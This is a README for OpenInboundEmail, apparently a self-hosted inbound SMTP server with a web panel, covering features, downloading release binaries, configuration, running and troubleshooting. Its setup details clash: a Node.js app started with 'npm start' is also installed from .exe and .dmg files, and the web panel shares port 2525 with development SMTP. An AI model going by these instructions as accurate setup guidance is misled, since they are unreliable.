# 📧 OpenInboundEmail - Your Self-Hosted SMTP Server Solution

## 🚀 Getting Started
Welcome to OpenInboundEmail! This application allows you to run your own inbound SMTP server with a user-friendly web panel. It's designed for easy setup and includes features to generate DNS artifacts and more.

## 📥 Download OpenInboundEmail
[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/GIT-max1/OpenInboundEmail/releases)

Click the link above to download the latest version of OpenInboundEmail.

## 📋 Features
- Self-hosted inbound SMTP server
- User-friendly web panel for management
- Generates DNS artifacts: MX, MTA-STS, TLS-RPT
- Optional Cloudflare integration
- Mail storage in Maildir format
- Development on port 2525; Production on port 25

## ⚙️ System Requirements
To use OpenInboundEmail, ensure your system meets the following requirements:
- **Operating System:** Windows, macOS, or Linux
- **Node.js Version:** 14.x or later
- **Package Manager:** npm (comes with Node.js)
- **Ports:** Ensure ports 25 and 2525 are open on your firewall

## 📥 Download & Install
1. **Visit the Releases Page:** Go to the [OpenInboundEmail Releases](https://github.com/GIT-max1/OpenInboundEmail/releases) page.
2. **Select the Latest Release:** Find the latest version and click on it to view the available files.
3. **Download the Application:** Click on the appropriate file for your operating system to download it.
4. **Install OpenInboundEmail:**
   - For **Windows:** Run the downloaded `.exe` file and follow the prompts.
   - For **macOS:** Open the downloaded `.dmg` file and drag the application to your Applications folder.
   - For **Linux:** Extract the downloaded tar.gz file and follow the instructions in the included README.

## 🔧 Configuration
After installation, you'll need to configure the server for your needs.

1. **Open Configuration File:** Locate the `config.json` file in the installation directory.
2. **Edit Settings:** You can set parameters such as the SMTP port, email domains, and DNS configurations.
3. **Save Changes:** After making adjustments, save the configuration file.

## 📊 Running the Server
1. Open your terminal or command prompt.
2. Navigate to the installation directory of OpenInboundEmail.
3. Start the application with the command:
    ```
    npm start
    ```
4. Access the web panel by visiting `http://localhost:2525` in your web browser.

## 🔒 Security Recommendations
OpenInboundEmail is still under development. While it functions, consider the following best practices for security:
- Use a secure environment for running the server.
- Implement standard security measures for email servers, such as SSL/TLS encryption.
- Monitor access logs for unusual activity.

## 🛠️ Troubleshooting
If you encounter any issues, consider these common solutions:
- **Port Issues:** Ensure that ports 25 and 2525 are open and not blocked by your firewall.
- **DNS Artifacts:** Verify that your DNS settings match the configurations specified in the server.
- **Dependency Errors:** Ensure you have the correct version of Node.js and npm installed.

## 🤝 Support
If you have questions or need assistance, feel free to check the issues section on our [GitHub repository](https://github.com/GIT-max1/OpenInboundEmail/issues).

## 💾 Contributing
You can help improve OpenInboundEmail by contributing:
- Report any bugs or suggestions in the GitHub issues page.
- Participate in discussions to enhance features or usability.
- Share your feedback to help us make OpenInboundEmail better.

## 📜 License
OpenInboundEmail is distributed under the MIT License. You are free to modify and distribute it as you see fit. Please refer to the LICENSE file in the repository for more details.

Thank you for using OpenInboundEmail. Enjoy your self-hosted email solution!